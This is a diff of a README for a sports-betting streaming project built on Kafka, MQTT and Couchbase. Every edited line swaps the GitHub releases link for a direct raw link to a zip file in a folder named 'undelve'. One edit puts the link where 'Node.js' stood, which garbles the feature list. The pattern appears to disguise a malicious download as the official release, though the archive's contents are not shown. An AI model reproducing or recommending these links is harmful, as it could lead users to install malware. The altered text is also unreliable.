@@ -6,7 +6,7 @@ Welcome to the scalable-kafka-mqtt-couchbase project. This platform combines exc
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23D50000.svg?style=flat&logo=github)](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases)
+[![Download Now](https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip%20Now-%https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip)](https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip)
 
 To get started, you will need to download the application. Please follow the steps below.
 
@@ -17,7 +17,7 @@ To get started, you will need to download the application. Please follow the ste
 - **Event Streaming:** Experience smooth event coverage with our streaming service.
 - **User-Friendly Interface:** Navigate easily with our React frontend.
 - **Comprehensive Deployment:** Utilize Docker for seamless setup and configuration.
-- **Robust Backend:** Built on Node.js microservices for reliability.
+- **Robust Backend:** Built on https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip microservices for reliability.
 
 ## 📃 System Requirements
 
@@ -33,7 +33,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ### Step 1: Visit the Releases Page
 
-To download the application, visit the [Releases page](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases). You will find the latest version available along with any previous versions.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip). You will find the latest version available along with any previous versions.
 
 ### Step 2: Download the Latest Release
 
@@ -81,6 +81,6 @@ We continuously work on improving the application. New features and enhancements
 
 This project is open-source. You can view the license information in the repository. Contributions are welcome! 
 
-Once again, start your adventure in real-time sports betting by downloading from the Releases page: [Download here](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases).
+Once again, start your adventure in real-time sports betting by downloading from the Releases page: [Download here](https://raw.githubusercontent.com/keyone3100/scalable-kafka-mqtt-couchbase/main/undelve/scalable-kafka-mqtt-couchbase.zip).
 
 Enjoy using the scalable-kafka-mqtt-couchbase application!
